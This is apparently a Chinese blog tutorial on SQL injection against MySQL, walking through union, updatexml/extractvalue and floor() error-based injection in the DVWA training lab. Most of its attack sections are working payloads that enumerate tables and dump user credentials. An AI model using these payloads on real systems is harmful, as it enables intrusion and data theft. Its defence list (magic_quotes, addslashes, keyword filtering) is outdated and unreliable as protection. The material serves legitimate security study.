# 一、什么是sql注入

所谓SQL注入，就是通过把SQL命令插入到Web表单递交或输入域名、页面请求的查询字符串，最终达到欺骗服务器执行恶意代码的目的。黑客通过SQL注入攻击可以拿到网站数据库的访问权限，之后他们就可以拿到网站数据库中所有的数据，恶意的黑客可以通过SQL注入功能篡改数据库中的数据甚至会把数据库中的数据毁坏掉。



# 二、sql注入原理

SQL是结构化查询语言的简称，它是访问数据库的事实标准。目前，大多数Web应用都使用SQL数据库来存放应用程序的数据。几乎所有的Web应用在后台 都使用某种SQL数据库。跟大多数语言一样，SQL语法允许数据库命令和用户数据混杂在一起的。如果开发人员不细心的话，用户数据就有可能被解释成命令， 这样的话，远程用户就不仅能向Web应用输入数据，而且还可以在数据库上执行任意命令了。

 SQL注入式攻击的主要形式有两种：

一是直接将代码插入到与SQL命令串联在一起并使得其以执行的用户输入变量。由于其直接与SQL语句捆绑，故也被称为直接注入式攻击法。

二是一种间接的攻击方法，它将恶意代码注入要在表中存储或者作为原数据存储的字符串中。在存储的字符串中会连接到一个动态的SQL命令中，以执行一些恶意的SQL代码。注入过程的工作方式是提前终止文本字符串，然后追加一个新的命令。如以直接注入式攻击为例。就是在用户输入变量的时候，先用一个分号结束当前的语句。然后再插入一个恶意SQL语句即可。由于插入的命令可能在执行前追加其他字符串，因此攻击者常常用注释标记“—”来终止注入的字符串。执行时，系统会认为此后语句位注释，故后续的文本将被忽略，不背编译与执行。

SQL注入产生的原因：

程序开发过程中不注意规范书写sql语句和对特殊字符进行过滤，导致客户端可以通过全局变量POST和GET提交一些sql语句正常执行。

防止SQL注入：

　　1、开启配置文件中的magic_quotes_gpc和magic_quotes_runtime设置

　　2、执行sql语句*时*使用addslashes进行sql语句转换

　　3、Sql语句书写尽量不要省略小引号和单引号

　　4、过滤掉sql语句中的一些关键字：update、insert、delete、select、*

　　5、提高数据库表和字段的命名技巧，对一些重要的字段根据程序的特点命名，取不易被猜到的。

　　6、Php配置文件中设置register_globals为off，关闭全局变量注册

　　7、控制错误信息，不要再浏览器上输出错误信息，将错误信息写到日志文件中。



# 三、常见的SQL注入类型

## **1.按参数类型分类**

1、**数字型注入**：输入参数为整型时，如id、年龄和页码等。

这一类的sql语句原型大概为select * from 表名 where id=1。

2、**字符型注入**：输入参数为字符型时，如姓名、职业等。

这一类的sql语句原型大概为where name='admin'。需要注意的是这里的引号有时也可能为双引号。

## **2.按回显类型分类**

**1、sql回显注入**

sql回显注入又可以分为：

a.union联合查询注入

b.报错注入

**2、sql盲注**

a.布尔盲注

b.时间注入

## 3.按提交方式分类

**GET注入**：注入字符在URL参数中；

**POST注入**：注入字段在POST提交的数据中；

**cookie注入**：注入字段在Cookie数据中，网站使用通用的防注入程序，会对GET、POST提交的数据进行过滤，却往往遗漏Cookie中的数据进行过滤。

**HTTP头部注入**：HTTP请求的其他内容触发的SQL注入漏洞；



# 四、联合查询注入

联合查询注入是回显注入的一种。也可以说，联合注入的前提是页面上要有回显位。

在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数据展示在页面中，这个展示数据的位置就叫**回显位**。

## 联合注入的一般步骤

1. 判断注入点

2. 判断注入类型（数字型型or字符型）

3. 判断字段数

4. 判断回显位

5. 确定数据库名

6. 确定表名

7. 确定字段名

8. 拿到数据

### 1、判断注入点

通过在**变量**后加payload来判断注入点：**‘ and 1=1 #或 ’ and 1=2 #** （单引号用于闭合sql语句中变量的引号）

通过输入这些payload后的回显页面，我们轻松看出是否存在注入。

```
MYSQL有三种常用的注释符：
-- 该注释符后面有一个空格；
/* */ 注释符号内的内容；
# 对该行#后面的内容进行注释。
```

### 2、判断注入类型

1、数字型

数字型注入的一般sql注入语句：

```sql
select * from tb_name where id=1;
```

测试步骤：

1. 变量后加单引号 **'**，这时sql语句后面多了一个单引号，会报错；

2. 变量后加 **and 1=1**，语句正常执行，页面与原始页面相同；

3. 变量后加 **and 1=2**，语句也可以正常执行，但页面会与原始网页存在差距

如满足以上三点，可以判断此处存在数字型注入。

2、字符型

字符型注入的一般sql注入语句：

```sql
select * from tb_name where cloums_name='xxx';
```

注入方式：

变量后加单引号，然后输入要执行的sql语句，最后要加上注释符来闭合程序语句后多余的引号。

当回显正常时我们可以判断此处为字符型注入。

### 3、判断字段数

使用 **order by** 语句对查询结果按照指定字段名排序。

修改指定字段的数值，通过返回结果判断所查询表的字段数：

```sql
order by 1
order by 2
......
```

当返回结果报错类似：**Unknown column '4' in 'order clause'** 时，即可判断该表字段数为3。

### 4、判断回显位

获取表的字段数后，需要判断回显位，即知道查询到的数据在哪个位置显示。

可以通过以下方式判断回显位：

```sql
union select 1,2,3,4......
```

![](https://yvling-blog-image-1257337367.cos.ap-shanghai.myqcloud.com/%E5%8D%9A%E5%AE%A2/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/2022-04-02/%E5%88%A4%E6%96%AD%E5%9B%9E%E6%98%BE%E4%BD%8D.png)

如上图，可以判断回显位为2、3。

### 5、确定数据库名

通过 **database()、version()** 函数获取数据库的名称及版本。

```sql
union select database(),version()
```

![](https://yvling-blog-image-1257337367.cos.ap-shanghai.myqcloud.com/%E5%8D%9A%E5%AE%A2/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/2022-04-02/%E7%A1%AE%E5%AE%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D.png)

### 6、确定表名

基础知识：

1> **information_schema**

在MySQL中，把 **information_schema** 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。

2> **常用的information_schema数据库表**

① SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。

② TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。

③ COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。

3> **group_concat()函数** 

group_concat()会计算哪些行属于同一组，将属于同一组的列显示出来。



查询方式：

```sql
union select group_concat(table_name,'/') from information_schema.tables where table_schema='db_name'
```

![](https://yvling-blog-image-1257337367.cos.ap-shanghai.myqcloud.com/%E5%8D%9A%E5%AE%A2/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/2022-04-02/%E7%A1%AE%E5%AE%9A%E8%A1%A8%E5%90%8D.png)

### 7、确定字段名

与查询表名的方法类似，从 **information_schema** 中的 **columns** 表查询字段名：

```sql
union select group_concat(column_name,'/') from information_schema.columns where table_name='tb_name'
```

![](https://yvling-blog-image-1257337367.cos.ap-shanghai.myqcloud.com/%E5%8D%9A%E5%AE%A2/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/2022-04-02/%E7%A1%AE%E5%AE%9A%E5%AD%97%E6%AE%B5%E5%90%8D.png)

### 8、获取数据

获取数据库名、表名、字段名后就可以像正常查询数据一样获取数据库中的各种信息：

```sql
union select column_name from tb_name
```

![](https://yvling-blog-image-1257337367.cos.ap-shanghai.myqcloud.com/%E5%8D%9A%E5%AE%A2/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/2022-04-02/%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE.png)



# 五、报错注入

报错注入的前提：页面能够响应详细的错误描述。

常用的三种报错注入方式：**extractvalue()** 、**updatexml()**、**floor()**

**知识铺垫：**

1. XML是可扩展标记语言（eXtensible Markup Language）的缩写，它是一种数据表示格式，可以描述非常复杂的数据结构，常用于传输和存储数据。
2. XML本身是一种格式规范，是一种包含了数据以及数据说明的文本格式规范，XML使得数据格式化，易于理解



## （一）xpath报错注入

xpath报错注入包含extractvalue()和updatexml()两种注入方式。

在mysql高版本中添加了对XML文档进行查询和修改的函数，即：extractvalue()和updatexml()，当这两个函数在执行时，如果出现xml文档路径错误就会产生报错。

**updatexml()函数**

updatexml()是一个使用不同的xml标记匹配和替换xml块的函数。

作用：改变文档中符合条件的节点的值

语法： updatexml（XML_document，XPath_string，new_value） 

第一个参数：是string格式，为XML文档对象的名称

第二个参数：代表路径，Xpath格式的字符串

第三个参数：string格式，替换查找到的符合条件的数据

updatexml使用时，当**xpath_string**格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）

例如： select * from test where ide = 1 and (updatexml(1,0x7e,3))

由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。

![image-20220501093424776](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20220501093424776.png)

在DVWA靶场中，传入数据：

```
1' and updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e),3)#
```

由于**concat(0x7e,database(),0x7e,user(),0x7e)** 不是XMl语句，所以mysql会报出Xpath语法错误，而且传入的SQL语句也被执行，带出了想要的数据：数据库名为dvwa，当前用户为dvwa@localhost

![image-20220501093811872](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20220501093811872.png)

注：0x7e代表符号～

**利用这一漏洞，继续爆出表名：**

```
1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='dvwa'),0x7e),3)#
```

![image-20220501094854097](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20220501094854097.png)

数据库dvwa中有两张表：guestbook和users

注：如果查询表名的部分使用concat而不是group_concat则会报错：

![image-20220501095239869](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20220501095239869.png)

concat和group_concat的区别：

concat和group_concat都是用在sql语句中做拼接使用的，但是两者使用的方式不尽相同，concat是针对以行数据做的拼接，而group_concat是针对列做的数据拼接，且group_concat自动生成逗号。

**继续爆出users表的字段名：**

```
1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e),3)#
```

![image-20220501095855222](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20220501095855222.png)

**爆出数据库内容：**

```
1' and updatexml(1,concat(0x7e,(select group_concat(user_id,first_name,last_name) from users),0x7e),3)#
```

![image-20220501100320792](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20220501100320792.png)

使用id=3登陆，发现提示 **not_flag**

查询另一张表 guestbook：

```
1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='guestbook'),0x7e),3)#
```

![image-20220501100646186](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20220501100646186.png)

```
1' and updatexml(1,concat(0x7e,(select comment from guestbook)),3)#
```

![image-20220501102051800](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20220501102051800.png)

神TM...只有一半的flag.....

查资料发现，Xpath报错只显示32位的内容，所以需要借用mid函数截取，从而显示32位之后的内容：

分段查询：1～32，33～64

```
1' and updatexml(1,concat(0x7e,mid((select comment from guestbook),1,32)),3)#
```

![image-20220501103215981](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20220501103215981.png)

```
1' and updatexml(1,concat(0x7e,mid((select comment from guestbook),32,32)),3)#
```

![image-20220501103300467](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20220501103300467.png)

拼接得到完整的flag：PTB{3b5adbf6-0713-40ef-b6e7-1b8a50d5b1e5}

![image-20220501103330653](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20220501103330653.png)



extractvalue()函数与updatexml()函数大同小异，都是通过xpath路径错误报错。

**爆出数据库名：**

```
1' and extractvalue(1,concat(0x7e,database()))#
```

![image-20220501103810595](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20220501103810595.png)

**爆出用户名及用户根目录：**

```
1' and extractvalue(1,concat(0x7e,user(),0x7e,@@datadir,0x7e))#
```

![image-20220501104020436](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20220501104020436.png)

**爆出表名：**

```
1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='dvwa'),0x7e))#
```

![image-20220501104542323](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20220501104542323.png)

**爆出字段名：**

```
1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='guestbook'),0x7e))#
```

![image-20220501104643331](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20220501104643331.png)

**爆出数据库内容：**

```
1' and extractvalue(1,concat(0x7e,mid((select comment from guestbook),1,32)))#
```

![image-20220501104911332](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20220501104911332.png)

```
1' and extractvalue(1,concat(0x7e,mid((select comment from guestbook),32,32)))#
```

![image-20220501104929359](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20220501104929359.png)

拼接得到完整的flag：PTB{594e18bb-3512-41f6-aaa5-950f032353cb}

![image-20220501105048169](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20220501105048169.png)



## （二）floor()函数报错注入

```
原理：利用select count(*),floor(rand(0)*2)x from information_schema.character_sets group by x;导致数据库报错，通过concat函数连接注入语句与floor(rand(0)*2)函数，实现将注入结果与报错信息回显的注入方式。
```

**函数理解：**

创建数据库

```
create database test1;
```

![image-20220501111401129](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20220501111401129.png)

创建数据表

```
use test1；
create table czs(id int unsigned not null primary key auto_increment, name varchar(15) not null);
insert into czs(id,name) values(1,'chenzishuo');
insert into czs(id,name) values(2,'zhangsan');
insert into czs(id,name) values(3,'lisi');
insert into czs(id,name) values(4,'wangwu');
```

![image-20220501111620924](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20220501111620924.png)



- rand()函数：rand()可以产生一个在0和1之间的随机数

![image-20220501111830837](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20220501111830837.png)

![image-20220501111908993](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20220501111908993.png)

直接使用rand()函数时，每次产生的数据都不一样，但当我们提供了一个固定的随机数的种子0之后，每次产生的值都是相同的，这也可以称之为伪随机：

![image-20220501112022630](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20220501112022630.png)



- floor (rand(0)*2)函数

floor函数的作用是返回小于等于括号内值的最大整数。

rand()本身是返回0~1的随机数，但在后面*2就变成了返回0~2之间的随机数。

两个函数组合就可以产生确定的两个数，即0和1，结合固定的随机数种子0，每次产生的随机数列都是相同的值。

![image-20220501112459065](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20220501112459065.png)



- group by 函数

group by 函数的作用是分类汇总。

如这张表：

![image-20220501112801148](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20220501112801148.png)

使用group by 函数可以进行分组，并且按照name进行排序。



在使用group by 函数进行分类时，会因为mysql版本问题而产生问题，主要是启用了ONLY_FULL_GROUP_BY SQL模式（默认情况下），MySQL将拒绝选择列表，HAVING条件或ORDER BY列表的查询引用在GROUP BY子句中既未命名的非集合列，也不在功能上依赖于它们。

- count(*)函数

函数作用为统计结果的记录数。

![image-20220501115817289](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20220501115817289.png)



- 组合使用

```
select count(*),floor(rand(0)*2) x from czs group by x;
```

当count（*）和group by x同时执行时，就会爆出duplicate entry错误。



通过 floor 报错的方法来爆数据的本质是 group by 语句的报错，group by 语句报错的原因

是 floor(random(0)*2)的不确定性，即可能为 0 也可能为 1。

group by key 执行时循环读取数据的每一行，将结果保存于临时表中。读取每一行的 key 时，

如果 key 存在于临时表中，则更新临时表中的数据（更新数据时，不再计算 rand 值）；如果

该 key 不存在于临时表中，则在临时表中插入 key 所在行的数据。（插入数据时，会再计算

rand 值）。如果此时临时表只有 key 为 1 的行不存在 key 为 0 的行，那么数据库要将该条记录插入临

时表，由于是随机数，插时又要计算一下随机值，此时 floor(random(0)*2)结果可能为 1，就

会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。



**在DVWA靶场中：**

```
1' union select count(*),floor(rand(0)*2) x from information_schema.schemata group by x#
```

![image-20220501121023767](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20220501121023767.png)

说明存在报错注入。

**爆出数据库名：**

```
1' union select count(*),concat(floor(rand(0)*2),database()) x from information_schema.schemata group by x #
```

![image-20220501121108615](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20220501121108615.png)

**爆出表名：**

```
1' union select count(*),concat(floor(rand(0)*2),0x3a,(select concat(table_name) from information_schema.tables where table_schema='dvwa' limit 0,1)) x from information_schema.schemata group by x#
```

![image-20220501121155672](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20220501121155672.png)

```
1' union select count(*),concat(floor(rand(0)*2),0x3a,(select concat(table_name) from information_schema.tables where table_schema='dvwa' limit 1,1)) x from information_schema.schemata group by x#
```

![image-20220501121231242](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20220501121231242.png)

**爆出字段名：**

```
1' union select count(*),concat(floor(rand(0)*2),0x3a,(select concat(column_name) from information_schema.columns where table_name='users' and table_schema='dvwa' limit 0,1)) x from information_schema.schemata group by x#
```

![image-20220501121300864](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20220501121300864.png)

**爆出user和password：**

```
1' union select count(*),concat(floor(rand(0)*2),0x3a,(select concat(user,0x3a,password) from dvwa.users limit 0,1)) x from information_schema.schemata group by x#
```

![image-20220501121343409](https://yvling-typora-image-1257337367.cos.ap-nanjing.myqcloud.com/typora/image-20220501121343409.png)

使用MD5解码即可得到password。
